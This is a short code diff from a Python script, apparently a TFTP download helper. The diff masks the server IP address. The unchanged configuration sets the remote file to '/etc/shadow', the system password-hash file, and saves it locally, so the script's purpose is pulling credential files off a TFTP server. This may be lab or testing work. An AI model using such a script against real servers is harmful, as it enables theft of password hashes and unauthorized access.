@@ -17,6 +17,6 @@ if __name__ == "__main__":
     # Replace the following values with your specific configuration
     remote_file = "/etc/shadow"  # The file you want to download from the TFTP server
     local_file = "shadow_file.txt"  # The local file path to save the downloaded file
-    server_ip = "192.168.192.130"  # The IP address of the TFTP server
+    server_ip = "*******************"  # The IP address of the TFTP server
 
     tftp_get(remote_file, local_file, server_ip)
